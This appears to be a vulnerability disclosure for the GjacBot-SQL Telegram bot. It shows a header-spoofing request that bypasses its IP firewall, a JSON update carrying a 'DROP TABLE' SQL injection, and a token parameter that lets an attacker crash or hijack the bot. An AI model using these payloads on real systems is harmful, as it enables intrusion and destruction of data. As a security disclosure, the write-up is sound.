# Proof of Concept for GjacBot-SQL

In this paper we will discuss about the main security vulnerabilities found in [GjacBot-SQL](https://github.com/GiacomoDevIT/GjacBot-SQL/).
(Update at 07/28/2020)

## Main vulnerabilities

### 1. XFF bypass in [waf.php](https://github.com/GiacomoDevIT/GjacBot-SQL/blob/master/waf.php)

One of the biggest issues that we found during our review is this quite easy bypassable Firewall:
you only need to change the ```X-Forwarded-For``` Header value in the HTTP-Request to one of the accepted IP addresses in order to bypass this firewall.
```
GET /path/to/bot.php?api=[] HTTP/1.1
Host: localhost:80
X-Forwarded-For: 149.154.160.0
Content-Type: application/json

-JSON UPDATE BODY-
```

### 2. SQL Injection in [funzioni.php](https://github.com/GiacomoDevIT/GjacBot-SQL/blob/master/funzioni.php)

Another very big issue found in this project is the multitude of potential SQL Injections found:
whenever ```$chat_id``` is used, there is a possible SQLi, due to the fact that it's always possible to change it in the fake request body, allowing us to drop tables, overwrite data and so on.
``` JSON
{
  "update_id": 143970686,
  "message": {
    "message_id": 235833,
    "from": {
      "id": "105; DROP TABLE bot;",
      "is_bot": false,
      "first_name": "Lorenzo",
      "username": "pwnedbyrelooandwilkenfeld ':D'",
      "language_code": "it"
    },
    "date": 1595933493,
    "text": "/start"
  }
}
```

### 3. Deadly Get Param Check in [bot.php](https://github.com/GiacomoDevIT/GjacBot-SQL/blob/master/bot.php)

Although its shortness, this file is full of destructive bugs and vulnerabilities:

The first ```if``` statement checks if the Telegram Bot API Token is sent and, if present, it's used as the bot token. This bug leads to two different options:

- Pass an empty token, which will crash the bot;
- Pass a malicious token, in order to redirect all the messages to a different bot (making the original one useless).

## Authors

You can find us on GitHub:

- [@reloonfire](https://www.github.com/reloonfire)
- [@Wilkenfeld](https://www.github.com/Wilkenfeld)

Or Twitter:

- [@reloonfireit](https://www.twitter.com/reloonfireit)
- [@Wilkenfeld](https://www.twitter.com/rpomiato)
